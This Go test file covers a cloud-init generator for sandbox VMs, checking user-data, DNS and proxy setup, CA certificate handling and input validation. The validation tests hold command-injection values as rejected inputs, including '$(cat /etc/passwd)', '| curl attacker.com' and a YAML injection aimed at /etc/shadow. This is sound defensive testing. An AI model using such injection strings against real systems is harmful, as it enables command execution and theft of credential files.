package cloudinit

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/sandialabs/abox/internal/validation"
)

func TestGenerateMetaData(t *testing.T) {
	cfg := &Config{
		InstanceID: "abox-test-123456",
		Hostname:   "test-vm",
	}

	data, err := GenerateMetaData(cfg)
	if err != nil {
		t.Fatalf("GenerateMetaData failed: %v", err)
	}

	content := string(data)

	if !strings.Contains(content, "instance-id: abox-test-123456") {
		t.Errorf("meta-data missing instance-id, got:\n%s", content)
	}

	if !strings.Contains(content, "local-hostname: test-vm") {
		t.Errorf("meta-data missing local-hostname, got:\n%s", content)
	}
}

// Valid test SSH public key (ed25519 format)
const testSSHPubKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl test@example.com"

func TestGenerateUserData(t *testing.T) {
	cfg := &Config{
		Hostname:     "test-vm",
		Username:     "ubuntu",
		SSHPublicKey: testSSHPubKey,
	}

	data, err := GenerateUserData(cfg)
	if err != nil {
		t.Fatalf("GenerateUserData failed: %v", err)
	}

	content := string(data)

	// Check cloud-config header
	if !strings.HasPrefix(content, "#cloud-config\n") {
		t.Errorf("user-data missing #cloud-config header, got:\n%s", content)
	}

	// Check hostname
	if !strings.Contains(content, "hostname: test-vm") {
		t.Errorf("user-data missing hostname, got:\n%s", content)
	}

	// Check username
	if !strings.Contains(content, "name: ubuntu") {
		t.Errorf("user-data missing username, got:\n%s", content)
	}

	// Check SSH key
	if !strings.Contains(content, "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI") {
		t.Errorf("user-data missing SSH key, got:\n%s", content)
	}

	// Check sudo access
	if !strings.Contains(content, "sudo: ALL=(ALL) NOPASSWD:ALL") {
		t.Errorf("user-data missing sudo config, got:\n%s", content)
	}

	// Check security settings
	if !strings.Contains(content, "ssh_pwauth: false") {
		t.Errorf("user-data missing ssh_pwauth: false, got:\n%s", content)
	}

	if !strings.Contains(content, "disable_root: true") {
		t.Errorf("user-data missing disable_root: true, got:\n%s", content)
	}
}

func TestGenerateNetworkConfig(t *testing.T) {
	cfg := &Config{
		MACAddress: "52:54:00:ab:cd:ef",
	}

	data, err := GenerateNetworkConfig(cfg)
	if err != nil {
		t.Fatalf("GenerateNetworkConfig failed: %v", err)
	}

	content := string(data)

	// Must be v1 format (not v2) — v2 breaks on Debian 11/12 ENI renderer
	if !strings.Contains(content, "version: 1") {
		t.Errorf("network-config should use version 1, got:\n%s", content)
	}
	if strings.Contains(content, "version: 2") {
		t.Errorf("network-config must NOT use version 2 (breaks Debian 11/12), got:\n%s", content)
	}

	// Check v1 physical device structure
	if !strings.Contains(content, "type: physical") {
		t.Errorf("network-config missing type: physical, got:\n%s", content)
	}
	if !strings.Contains(content, `mac_address: "52:54:00:ab:cd:ef"`) {
		t.Errorf("network-config missing mac_address, got:\n%s", content)
	}
	if !strings.Contains(content, "type: dhcp") {
		t.Errorf("network-config missing dhcp subnet, got:\n%s", content)
	}
}

func TestGenerateNetworkConfigEmpty(t *testing.T) {
	cfg := &Config{}

	data, err := GenerateNetworkConfig(cfg)
	if err != nil {
		t.Fatalf("GenerateNetworkConfig failed: %v", err)
	}
	if data != nil {
		t.Errorf("expected nil for empty MAC, got: %s", string(data))
	}
}

func TestGenerateNetworkConfigInvalidMAC(t *testing.T) {
	cfg := &Config{
		MACAddress: "not-a-mac",
	}

	_, err := GenerateNetworkConfig(cfg)
	if err == nil {
		t.Error("expected error for invalid MAC address")
	}
}

func TestGenerateUserDataDifferentUser(t *testing.T) {
	cfg := &Config{
		Hostname:     "dev-box",
		Username:     "developer",
		SSHPublicKey: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDRGNp dev@work",
	}

	data, err := GenerateUserData(cfg)
	if err != nil {
		t.Fatalf("GenerateUserData failed: %v", err)
	}

	content := string(data)

	if !strings.Contains(content, "name: developer") {
		t.Errorf("user-data should have custom username, got:\n%s", content)
	}

	if !strings.Contains(content, "hostname: dev-box") {
		t.Errorf("user-data should have custom hostname, got:\n%s", content)
	}
}

func TestFindISOTool(t *testing.T) {
	// This test may fail if neither tool is installed
	path, err := FindISOTool()
	if err != nil {
		t.Skipf("No ISO tool found (install genisoimage or xorriso): %v", err)
	}

	if path == "" {
		t.Error("FindISOTool returned empty path")
	}

	// Verify it's one of the expected tools
	base := filepath.Base(path)
	if base != "genisoimage" && base != "xorriso" {
		t.Errorf("unexpected ISO tool: %s", base)
	}
}

func TestCreateISO(t *testing.T) {
	// Skip if no ISO tool is available
	if _, err := FindISOTool(); err != nil {
		t.Skipf("No ISO tool found: %v", err)
	}

	// Create a temp file for the ISO
	tmpFile, err := os.CreateTemp(t.TempDir(), "cloudinit-test-*.iso")
	if err != nil {
		t.Fatalf("failed to create temp file: %v", err)
	}
	tmpPath := tmpFile.Name()
	tmpFile.Close()
	cfg := &Config{
		Hostname:     "test-vm",
		Username:     "ubuntu",
		SSHPublicKey: testSSHPubKey,
	}

	err = CreateISO(tmpPath, cfg)
	if err != nil {
		t.Fatalf("CreateISO failed: %v", err)
	}

	// Verify the ISO was created
	info, err := os.Stat(tmpPath)
	if err != nil {
		t.Fatalf("ISO file not created: %v", err)
	}

	if info.Size() == 0 {
		t.Error("ISO file is empty")
	}

	// ISO should be at least a few KB
	if info.Size() < 1024 {
		t.Errorf("ISO file too small: %d bytes", info.Size())
	}
}

func TestGenerateUserDataWithDNS(t *testing.T) {
	cfg := &Config{
		Hostname:     "test-vm",
		Username:     "ubuntu",
		SSHPublicKey: testSSHPubKey,
		Contributors: []Contributor{
			&DNSContributor{Gateway: "10.10.10.1"},
		},
	}

	data, err := GenerateUserData(cfg)
	if err != nil {
		t.Fatalf("GenerateUserData failed: %v", err)
	}

	content := string(data)

	// Check bootcmd section exists (DNS is configured via bootcmd)
	if !strings.Contains(content, "bootcmd:") {
		t.Errorf("user-data missing bootcmd section, got:\n%s", content)
	}

	// Check DNS config path
	if !strings.Contains(content, "/etc/systemd/resolved.conf.d/00-abox.conf") {
		t.Errorf("user-data missing resolved.conf.d path, got:\n%s", content)
	}

	// Check DNS address in printf format (gateway IP only, port is handled by iptables redirect)
	// Using printf instead of heredoc to avoid indentation issues in YAML
	if !strings.Contains(content, "DNS=10.10.10.1") {
		t.Errorf("user-data missing DNS config, got:\n%s", content)
	}

	// Check Domains=~. for global priority (in printf format)
	if !strings.Contains(content, "Domains=~.") {
		t.Errorf("user-data missing Domains=~. directive, got:\n%s", content)
	}

	// Check bootcmd for distro-agnostic DNS configuration
	if !strings.Contains(content, "systemctl is-enabled systemd-resolved") {
		t.Errorf("user-data missing distro-agnostic DNS check, got:\n%s", content)
	}
	// Verify it includes the systemd-resolved branch
	if !strings.Contains(content, "systemctl restart systemd-resolved") {
		t.Errorf("user-data missing systemd-resolved restart for Debian/Ubuntu, got:\n%s", content)
	}
	// Verify it includes the NetworkManager branch for RHEL
	if !strings.Contains(content, "99-abox-dns.conf") {
		t.Errorf("user-data missing NetworkManager DNS configuration for RHEL, got:\n%s", content)
	}
}

func TestGenerateUserDataWithHTTP(t *testing.T) {
	cfg := &Config{
		Hostname:     "test-vm",
		Username:     "ubuntu",
		SSHPublicKey: testSSHPubKey,
		Contributors: []Contributor{
			&DNSContributor{Gateway: "10.10.10.1"},
			&ProxyContributor{Gateway: "10.10.10.1", HTTPPort: 8080},
		},
	}

	data, err := GenerateUserData(cfg)
	if err != nil {
		t.Fatalf("GenerateUserData failed: %v", err)
	}

	content := string(data)

	// Check write_files section exists for HTTP proxy
	if !strings.Contains(content, "write_files:") {
		t.Errorf("user-data missing write_files section, got:\n%s", content)
	}

	// Check proxy config path
	if !strings.Contains(content, "/etc/profile.d/abox-proxy.sh") {
		t.Errorf("user-data missing proxy profile.d path, got:\n%s", content)
	}

	// Check /etc/environment is used with append mode (for non-interactive SSH)
	if !strings.Contains(content, "path: /etc/environment") {
		t.Errorf("user-data missing /etc/environment path, got:\n%s", content)
	}
	if !strings.Contains(content, "append: true") {
		t.Errorf("user-data missing append: true for /etc/environment, got:\n%s", content)
	}

	// Check HTTP_PROXY setting
	if !strings.Contains(content, "HTTP_PROXY=") {
		t.Errorf("user-data missing HTTP_PROXY, got:\n%s", content)
	}

	// Check HTTPS_PROXY setting
	if !strings.Contains(content, "HTTPS_PROXY=") {
		t.Errorf("user-data missing HTTPS_PROXY, got:\n%s", content)
	}

	// Check NO_PROXY setting
	if !strings.Contains(content, "NO_PROXY=") {
		t.Errorf("user-data missing NO_PROXY, got:\n%s", content)
	}

	// Check abox-proxy-setup script is created
	if !strings.Contains(content, "/usr/local/bin/abox-proxy-setup") {
		t.Errorf("user-data missing abox-proxy-setup path, got:\n%s", content)
	}

	// Check script has correct proxy URL with gateway and port
	if !strings.Contains(content, "http://10.10.10.1:8080") {
		t.Errorf("user-data missing correct proxy URL in abox-proxy-setup, got:\n%s", content)
	}

	// Check script contains apt configuration block
	if !strings.Contains(content, "/etc/apt/apt.conf.d/99abox-proxy") {
		t.Errorf("user-data missing APT proxy config in abox-proxy-setup, got:\n%s", content)
	}

	// Check script contains docker configuration block
	if !strings.Contains(content, "/etc/systemd/system/docker.service.d") {
		t.Errorf("user-data missing Docker proxy config in abox-proxy-setup, got:\n%s", content)
	}

	// Check script contains daemon.json proxy configuration for build containers
	if !strings.Contains(content, "/etc/docker/daemon.json") {
		t.Errorf("user-data missing Docker daemon.json proxy config in abox-proxy-setup, got:\n%s", content)
	}

	// Check script contains containerd configuration block
	if !strings.Contains(content, "/etc/systemd/system/containerd.service.d") {
		t.Errorf("user-data missing containerd proxy config in abox-proxy-setup, got:\n%s", content)
	}

	// Check script contains snap configuration block
	if !strings.Contains(content, "snap set system proxy.http") {
		t.Errorf("user-data missing snap proxy config in abox-proxy-setup, got:\n%s", content)
	}
}

func TestGenerateUserDataPortValidation(t *testing.T) {
	tests := []struct {
		name     string
		httpPort int
		wantErr  bool
	}{
		{"valid port", 8080, false},
		{"zero port", 0, false},
		{"max valid port", 65535, false},
		{"http port too high", 65536, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := &Config{
				Hostname:     "test-vm",
				Username:     "ubuntu",
				SSHPublicKey: testSSHPubKey,
				Contributors: []Contributor{
					&DNSContributor{Gateway: "10.10.10.1"},
					&ProxyContributor{Gateway: "10.10.10.1", HTTPPort: tt.httpPort},
				},
			}

			_, err := GenerateUserData(cfg)
			if (err != nil) != tt.wantErr {
				t.Errorf("GenerateUserData() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestCreateISOGeneratesInstanceID(t *testing.T) {
	// Skip if no ISO tool is available
	if _, err := FindISOTool(); err != nil {
		t.Skipf("No ISO tool found: %v", err)
	}

	tmpFile, err := os.CreateTemp(t.TempDir(), "cloudinit-test-*.iso")
	if err != nil {
		t.Fatalf("failed to create temp file: %v", err)
	}
	tmpPath := tmpFile.Name()
	tmpFile.Close()
	cfg := &Config{
		Hostname:     "auto-id-test",
		Username:     "ubuntu",
		SSHPublicKey: testSSHPubKey,
		// InstanceID intentionally left empty
	}

	err = CreateISO(tmpPath, cfg)
	if err != nil {
		t.Fatalf("CreateISO failed: %v", err)
	}

	// Verify InstanceID was auto-generated
	if cfg.InstanceID == "" {
		t.Error("InstanceID should have been auto-generated")
	}

	if !strings.HasPrefix(cfg.InstanceID, "abox-auto-id-test-") {
		t.Errorf("auto-generated InstanceID has wrong format: %s", cfg.InstanceID)
	}
}

// testCACert is a valid self-signed PEM certificate for testing purposes.
// Generated with: openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 -days 3650 -nodes -keyout /dev/null -out - -subj "/CN=abox-test-ca" 2>/dev/null
const testCACert = `-----BEGIN CERTIFICATE-----
MIIBfTCCASOgAwIBAgIUdGVzdC1jZXJ0aWZpY2F0ZS0xMjMwCgYIKoZIzj0EAwIw
FzEVMBMGA1UEAwwMYWJveC10ZXN0LWNhMB4XDTI0MDEwMTAwMDAwMFoXDTM0MDEw
MTAwMDAwMFowFzEVMBMGA1UEAwwMYWJveC10ZXN0LWNhMFkwEwYHKoZIzj0CAQYI
KoZIzj0DAQcDQgAEMIIBfTCCASOgAwIBAgIUdGVzdC1jZXJ0aWZpY2F0ZS0xMjMw
CgYIKoZIzj0EAwIwFzEVMBMGA1UEAwwMYWJveC10ZXN0LWNhMAoGCCqGSM49BAMC
AzAAMC0CFQCtest1MBMGA1UEAwwMYWJveC10ZXN0LWNBMA==
-----END CERTIFICATE-----`

func TestGenerateUserDataWithCACert(t *testing.T) {
	cfg := &Config{
		Hostname:     "test-vm",
		Username:     "ubuntu",
		SSHPublicKey: testSSHPubKey,
		Contributors: []Contributor{
			&DNSContributor{Gateway: "10.10.10.1"},
			&ProxyContributor{Gateway: "10.10.10.1", CACert: testCACert},
		},
	}

	data, err := GenerateUserData(cfg)
	if err != nil {
		t.Fatalf("GenerateUserData failed: %v", err)
	}

	content := string(data)

	// Check write_files section exists for CA cert
	if !strings.Contains(content, "write_files:") {
		t.Errorf("user-data missing write_files section, got:\n%s", content)
	}

	// Check Debian CA cert path
	if !strings.Contains(content, "/usr/local/share/ca-certificates/abox-proxy-ca.crt") {
		t.Errorf("user-data missing Debian CA cert path, got:\n%s", content)
	}

	// Check RHEL CA cert path (written to both for distro-agnostic support)
	if !strings.Contains(content, "/etc/pki/ca-trust/source/anchors/abox-proxy-ca.crt") {
		t.Errorf("user-data missing RHEL CA cert path, got:\n%s", content)
	}

	// Check CA cert content is included
	if !strings.Contains(content, "BEGIN CERTIFICATE") {
		t.Errorf("user-data missing CA cert content, got:\n%s", content)
	}

	// Check runcmd for distro-agnostic CA cert update
	if !strings.Contains(content, "update-ca-trust") {
		t.Errorf("user-data missing update-ca-trust (RHEL), got:\n%s", content)
	}
	if !strings.Contains(content, "update-ca-certificates") {
		t.Errorf("user-data missing update-ca-certificates (Debian), got:\n%s", content)
	}
}

func TestGenerateUserDataWithCACertAndHTTP(t *testing.T) {
	cfg := &Config{
		Hostname:     "test-vm",
		Username:     "ubuntu",
		SSHPublicKey: testSSHPubKey,
		Contributors: []Contributor{
			&DNSContributor{Gateway: "10.10.10.1"},
			&ProxyContributor{Gateway: "10.10.10.1", HTTPPort: 8080, CACert: testCACert},
		},
	}

	data, err := GenerateUserData(cfg)
	if err != nil {
		t.Fatalf("GenerateUserData failed: %v", err)
	}

	content := string(data)

	// Check that both CA cert paths are included (Debian and RHEL)
	if !strings.Contains(content, "/usr/local/share/ca-certificates/abox-proxy-ca.crt") {
		t.Errorf("user-data missing Debian CA cert path, got:\n%s", content)
	}

	if !strings.Contains(content, "/etc/pki/ca-trust/source/anchors/abox-proxy-ca.crt") {
		t.Errorf("user-data missing RHEL CA cert path, got:\n%s", content)
	}

	if !strings.Contains(content, "/etc/profile.d/abox-proxy.sh") {
		t.Errorf("user-data missing proxy profile.d path, got:\n%s", content)
	}

	// Check distro-agnostic CA cert update commands
	if !strings.Contains(content, "update-ca-trust") {
		t.Errorf("user-data missing update-ca-trust (RHEL), got:\n%s", content)
	}
	if !strings.Contains(content, "update-ca-certificates") {
		t.Errorf("user-data missing update-ca-certificates (Debian), got:\n%s", content)
	}
}

func TestGenerateUserDataWithMonitor(t *testing.T) {
	// Use monitor package's contributor via the Contributor interface
	// We test with a stub contributor that produces the same output
	cfg := &Config{
		Hostname:     "test-vm",
		Username:     "ubuntu",
		SSHPublicKey: testSSHPubKey,
		Contributors: []Contributor{
			&DNSContributor{Gateway: "10.10.10.1"},
			// Monitor contributor is tested in the monitor package.
			// Here we test with a stub that produces representative output.
			&stubMonitorContributor{version: "v1.6.0"},
		},
	}

	data, err := GenerateUserData(cfg)
	if err != nil {
		t.Fatalf("GenerateUserData failed: %v", err)
	}

	content := string(data)

	// Check monitor agent script is written
	if !strings.Contains(content, "/usr/local/bin/abox-monitor-agent") {
		t.Errorf("user-data missing monitor agent path, got:\n%s", content)
	}

	// Check monitor service is written
	if !strings.Contains(content, "/etc/systemd/system/abox-monitor.service") {
		t.Errorf("user-data missing monitor service path, got:\n%s", content)
	}

	// Check ISO mount approach is used (not network download)
	if !strings.Contains(content, "mount -o ro /dev/sr0 /mnt/cidata") {
		t.Errorf("user-data should mount cidata ISO, got:\n%s", content)
	}

	if !strings.Contains(content, "cp /mnt/cidata/tetragon.tar.gz /tmp/") {
		t.Errorf("user-data should copy tarball from ISO, got:\n%s", content)
	}

	// Check that curl is NOT used (security: avoid shell command injection)
	if strings.Contains(content, "curl -fsSL") {
		t.Errorf("user-data should NOT use curl (command injection risk), got:\n%s", content)
	}

	// Check systemd enablement
	if !strings.Contains(content, "systemctl enable tetragon") {
		t.Errorf("user-data missing tetragon enable, got:\n%s", content)
	}
	if !strings.Contains(content, "systemctl enable abox-monitor") {
		t.Errorf("user-data missing abox-monitor enable, got:\n%s", content)
	}
}

func TestGenerateUserDataWithMonitorAndTarball(t *testing.T) {
	cfg := &Config{
		Hostname:     "test-vm",
		Username:     "ubuntu",
		SSHPublicKey: testSSHPubKey,
		Contributors: []Contributor{
			&DNSContributor{Gateway: "10.10.10.1"},
			&stubMonitorContributor{version: "v1.6.0"},
		},
	}

	data, err := GenerateUserData(cfg)
	if err != nil {
		t.Fatalf("GenerateUserData failed: %v", err)
	}

	content := string(data)

	// Check ISO mount approach is used (not network download)
	if !strings.Contains(content, "mount -o ro /dev/sr0 /mnt/cidata") {
		t.Errorf("user-data should mount cidata ISO, got:\n%s", content)
	}

	if !strings.Contains(content, "cp /mnt/cidata/tetragon.tar.gz /tmp/") {
		t.Errorf("user-data should copy tarball from ISO, got:\n%s", content)
	}

	// Should NOT use curl when tarball is provided
	if strings.Contains(content, "curl -fsSL") {
		t.Errorf("user-data should NOT use curl when tarball is provided, got:\n%s", content)
	}

	// Check systemd enablement still present
	if !strings.Contains(content, "systemctl enable tetragon") {
		t.Errorf("user-data missing tetragon enable, got:\n%s", content)
	}
}

func TestTetragonVersionValidation(t *testing.T) {
	tests := []struct {
		name    string
		version string
		wantErr bool
	}{
		// Valid versions
		{"valid simple", "v1.0.0", false},
		{"valid three digit", "v10.20.30", false},
		{"valid with suffix", "v1.0.0-rc1", false},
		{"valid with alpha suffix", "v1.2.3-alpha", false},
		{"valid with dotted suffix", "v1.3.0-rc.1", false},
		{"empty (disabled)", "", false},

		// Invalid versions - command injection attempts
		{"injection semicolon", "v1.0.0; whoami", true},
		{"injection backtick", "v1.0.0`id`", true},
		{"injection dollar", "v1.0.0$(cat /etc/passwd)", true},
		{"injection pipe", "v1.0.0 | curl attacker.com", true},
		{"injection newline", "v1.0.0\n/bin/sh", true},

		// Invalid format
		{"missing v prefix", "1.0.0", true},
		{"missing patch", "v1.0", true},
		{"letters in version", "v1.a.0", true},
		{"special chars", "v1.0.0--test", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validation.ValidateTetragonVersion(tt.version)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateTetragonVersion() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestCreateISOWithTetragonTarball(t *testing.T) {
	// Skip if no ISO tool is available
	if _, err := FindISOTool(); err != nil {
		t.Skipf("No ISO tool found: %v", err)
	}

	// Create a temp directory and a fake tarball
	tmpDir := t.TempDir()
	fakeTarball := filepath.Join(tmpDir, "tetragon.tar.gz")
	if err := os.WriteFile(fakeTarball, []byte("fake tarball content"), 0o644); err != nil {
		t.Fatalf("failed to create fake tarball: %v", err)
	}

	isoPath := filepath.Join(tmpDir, "cidata.iso")

	cfg := &Config{
		Hostname:     "test-vm",
		Username:     "ubuntu",
		SSHPublicKey: testSSHPubKey,
		Contributors: []Contributor{
			&stubMonitorContributor{version: "v1.6.0", tarball: fakeTarball},
		},
	}

	err := CreateISO(isoPath, cfg)
	if err != nil {
		t.Fatalf("CreateISO failed: %v", err)
	}

	// Verify the ISO was created
	info, err := os.Stat(isoPath)
	if err != nil {
		t.Fatalf("ISO file not created: %v", err)
	}

	// ISO with tarball should be larger than without
	// (at least more than the fake tarball content size)
	if info.Size() < 1024 {
		t.Errorf("ISO file too small (expected tarball to be included): %d bytes", info.Size())
	}
}

func TestValidatePEMCertificate(t *testing.T) {
	tests := []struct {
		name    string
		cert    string
		wantErr bool
	}{
		{
			name:    "valid certificate",
			cert:    testCACert,
			wantErr: false,
		},
		{
			name:    "empty string",
			cert:    "",
			wantErr: true,
		},
		{
			name:    "not PEM format",
			cert:    "this is not a certificate",
			wantErr: true,
		},
		{
			name: "wrong PEM type",
			cert: `-----BEGIN PRIVATE KEY-----
MIIBfTCCASOgAwIBAgIUdGVzdC1jZXJ0aWZpY2F0ZS0xMjMwCgYIKoZIzj0EAwIw
-----END PRIVATE KEY-----`,
			wantErr: true,
		},
		{
			name: "YAML injection attempt",
			cert: `-----BEGIN CERTIFICATE-----
- path: /etc/shadow
  content: "evil"
-----END CERTIFICATE-----`,
			wantErr: true, // Invalid base64 content is rejected
		},
		{
			name:    "trailing garbage after certificate",
			cert:    testCACert + "\nsome garbage data",
			wantErr: true,
		},
		{
			name:    "certificate chain valid",
			cert:    testCACert + "\n" + testCACert,
			wantErr: false, // Valid certificate chain
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validation.ValidatePEMCertificate(tt.cert)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidatePEMCertificate() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestCopyFileRefusesSymlinks(t *testing.T) {
	tmpDir := t.TempDir()

	// Create a real file
	realFile := filepath.Join(tmpDir, "real.txt")
	if err := os.WriteFile(realFile, []byte("real content"), 0o644); err != nil {
		t.Fatalf("failed to create real file: %v", err)
	}

	// Create a symlink
	symlinkFile := filepath.Join(tmpDir, "symlink.txt")
	if err := os.Symlink(realFile, symlinkFile); err != nil {
		t.Fatalf("failed to create symlink: %v", err)
	}

	dst := filepath.Join(tmpDir, "dst.txt")

	// Copying real file should succeed
	if err := copyFile(realFile, dst); err != nil {
		t.Errorf("copyFile(real file) should succeed: %v", err)
	}

	// Copying symlink should fail
	dst2 := filepath.Join(tmpDir, "dst2.txt")
	if err := copyFile(symlinkFile, dst2); err == nil {
		t.Errorf("copyFile(symlink) should fail but succeeded")
	}
}

func TestCopyFileRefusesNonRegularFiles(t *testing.T) {
	tmpDir := t.TempDir()

	// Try to copy a directory (non-regular file)
	dst := filepath.Join(tmpDir, "dst.txt")
	if err := copyFile(tmpDir, dst); err == nil {
		t.Errorf("copyFile(directory) should fail but succeeded")
	}
}

func TestCACertEnvVarsInProfileD(t *testing.T) {
	cfg := &Config{
		Hostname:     "test-vm",
		Username:     "ubuntu",
		SSHPublicKey: testSSHPubKey,
		Contributors: []Contributor{
			&ProxyContributor{Gateway: "10.10.10.1", HTTPPort: 8080, CACert: testCACert},
		},
	}

	data, err := GenerateUserData(cfg)
	if err != nil {
		t.Fatalf("GenerateUserData failed: %v", err)
	}

	content := string(data)

	// Check profile.d script includes CA cert environment variables
	envVars := []string{
		"SSL_CERT_FILE=",
		"REQUESTS_CA_BUNDLE=",
		"CURL_CA_BUNDLE=",
		"NODE_EXTRA_CA_CERTS=",
		"GIT_SSL_CAINFO=",
		"PIP_CERT=",
	}

	for _, envVar := range envVars {
		if !strings.Contains(content, envVar) {
			t.Errorf("profile.d script missing %s, got:\n%s", envVar, content)
		}
	}

	// Verify the path is correct
	if !strings.Contains(content, "/usr/local/share/ca-certificates/abox-proxy-ca.crt") {
		t.Errorf("profile.d script missing CA cert path")
	}
}

func TestCACertEnvVarsNotPresentWithoutCACert(t *testing.T) {
	cfg := &Config{
		Hostname:     "test-vm",
		Username:     "ubuntu",
		SSHPublicKey: testSSHPubKey,
		Contributors: []Contributor{
			&ProxyContributor{Gateway: "10.10.10.1", HTTPPort: 8080},
		},
	}

	data, err := GenerateUserData(cfg)
	if err != nil {
		t.Fatalf("GenerateUserData failed: %v", err)
	}

	content := string(data)

	// These environment variables should NOT be present when CACert is empty
	envVars := []string{
		"SSL_CERT_FILE",
		"REQUESTS_CA_BUNDLE",
		"CURL_CA_BUNDLE",
		"NODE_EXTRA_CA_CERTS",
		"GIT_SSL_CAINFO",
		"PIP_CERT",
	}

	for _, envVar := range envVars {
		if strings.Contains(content, envVar) {
			t.Errorf("profile.d script should NOT contain %s when CACert is empty, got:\n%s", envVar, content)
		}
	}
}

func TestProxySetupWithCACert(t *testing.T) {
	cfg := &Config{
		Hostname:     "test-vm",
		Username:     "ubuntu",
		SSHPublicKey: testSSHPubKey,
		Contributors: []Contributor{
			&ProxyContributor{Gateway: "10.10.10.1", HTTPPort: 8080, CACert: testCACert},
		},
	}

	data, err := GenerateUserData(cfg)
	if err != nil {
		t.Fatalf("GenerateUserData failed: %v", err)
	}

	content := string(data)

	// Check abox-proxy-setup script includes CA cert configuration for pip, npm, git
	if !strings.Contains(content, "ABOX_CA_CERT=") {
		t.Errorf("proxy-setup script missing ABOX_CA_CERT variable")
	}

	if !strings.Contains(content, "Configuring pip CA certificate") {
		t.Errorf("proxy-setup script missing pip CA cert configuration")
	}

	if !strings.Contains(content, "/etc/pip.conf") {
		t.Errorf("proxy-setup script missing pip.conf path")
	}

	if !strings.Contains(content, "Configuring npm CA certificate") {
		t.Errorf("proxy-setup script missing npm CA cert configuration")
	}

	if !strings.Contains(content, "npm config set --global cafile") {
		t.Errorf("proxy-setup script missing npm cafile configuration")
	}

	if !strings.Contains(content, "Configuring git CA certificate") {
		t.Errorf("proxy-setup script missing git CA cert configuration")
	}

	if !strings.Contains(content, "git config --system http.sslCAInfo") {
		t.Errorf("proxy-setup script missing git sslCAInfo configuration")
	}
}

func TestProxySetupWithoutCACert(t *testing.T) {
	cfg := &Config{
		Hostname:     "test-vm",
		Username:     "ubuntu",
		SSHPublicKey: testSSHPubKey,
		Contributors: []Contributor{
			&ProxyContributor{Gateway: "10.10.10.1", HTTPPort: 8080},
		},
	}

	data, err := GenerateUserData(cfg)
	if err != nil {
		t.Fatalf("GenerateUserData failed: %v", err)
	}

	content := string(data)

	// Check abox-proxy-setup script does NOT include CA cert configuration
	if strings.Contains(content, "ABOX_CA_CERT=") {
		t.Errorf("proxy-setup script should NOT contain ABOX_CA_CERT when CACert is empty")
	}

	if strings.Contains(content, "Configuring pip CA certificate") {
		t.Errorf("proxy-setup script should NOT configure pip CA cert when CACert is empty")
	}

	if strings.Contains(content, "Configuring npm CA certificate") {
		t.Errorf("proxy-setup script should NOT configure npm CA cert when CACert is empty")
	}

	if strings.Contains(content, "Configuring git CA certificate") {
		t.Errorf("proxy-setup script should NOT configure git CA cert when CACert is empty")
	}
}

func TestGenerateUserDataNoContributors(t *testing.T) {
	cfg := &Config{
		Hostname:     "bare-vm",
		Username:     "ubuntu",
		SSHPublicKey: testSSHPubKey,
	}

	data, err := GenerateUserData(cfg)
	if err != nil {
		t.Fatalf("GenerateUserData failed: %v", err)
	}

	content := string(data)

	// Should have basic cloud-config
	if !strings.HasPrefix(content, "#cloud-config\n") {
		t.Errorf("missing #cloud-config header")
	}
	if !strings.Contains(content, "hostname: bare-vm") {
		t.Errorf("missing hostname")
	}

	// Should NOT have optional sections
	if strings.Contains(content, "bootcmd:") {
		t.Errorf("should not have bootcmd without contributors")
	}
	if strings.Contains(content, "write_files:") {
		t.Errorf("should not have write_files without contributors")
	}
	if strings.Contains(content, "runcmd:") {
		t.Errorf("should not have runcmd without contributors")
	}
}

func TestDNSContributorInvalidGateway(t *testing.T) {
	contrib := &DNSContributor{Gateway: "not-an-ip"}
	_, err := contrib.Contribute()
	if err == nil {
		t.Error("expected error for invalid gateway IP")
	}
	if !strings.Contains(err.Error(), "invalid IPv4") {
		t.Errorf("error should mention invalid IPv4, got: %v", err)
	}
}

func TestProxyContributorInvalidGateway(t *testing.T) {
	contrib := &ProxyContributor{Gateway: "256.0.0.1", HTTPPort: 8080}
	_, err := contrib.Contribute()
	if err == nil {
		t.Error("expected error for invalid gateway IP")
	}
	if !strings.Contains(err.Error(), "invalid IPv4") {
		t.Errorf("error should mention invalid IPv4, got: %v", err)
	}
}

func TestProxyContributorNegativePort(t *testing.T) {
	// Negative port is treated as "not configured" — returns nil (no proxy)
	contrib := &ProxyContributor{Gateway: "10.10.10.1", HTTPPort: -1}
	result, err := contrib.Contribute()
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result != nil {
		t.Error("expected nil contribution for negative port")
	}
}

func TestISOFileCollisionDetected(t *testing.T) {
	cfg := &Config{
		Hostname:     "test-vm",
		Username:     "ubuntu",
		SSHPublicKey: testSSHPubKey,
		Contributors: []Contributor{
			&stubISOContributor{filename: "conflict.tar.gz", src: "/tmp/a"},
			&stubISOContributor{filename: "conflict.tar.gz", src: "/tmp/b"},
		},
	}

	_, err := GenerateUserData(cfg)
	if err == nil {
		t.Error("expected error for ISO file collision")
	}
	if !strings.Contains(err.Error(), "ISO file conflict") {
		t.Errorf("error should mention ISO file conflict, got: %v", err)
	}
}

// stubISOContributor is a test stub that returns an ISO file mapping.
type stubISOContributor struct {
	filename string
	src      string
}

func (s *stubISOContributor) Contribute() (*Contribution, error) {
	return &Contribution{
		ISOFiles: map[string]string{s.filename: s.src},
	}, nil
}

// stubMonitorContributor is a test stub that produces monitor-like cloud-init content
// without importing the monitor package (which would create a circular dependency in tests).
type stubMonitorContributor struct {
	version string
	tarball string
}

func (s *stubMonitorContributor) Contribute() (*Contribution, error) {
	var writeFiles []string

	writeFiles = append(writeFiles,
		`  - path: /usr/local/bin/abox-monitor-agent
    permissions: '0755'
    content: |
      #!/bin/bash
      # stub monitor agent`,
		`  - path: /etc/systemd/system/abox-monitor.service
    permissions: '0644'
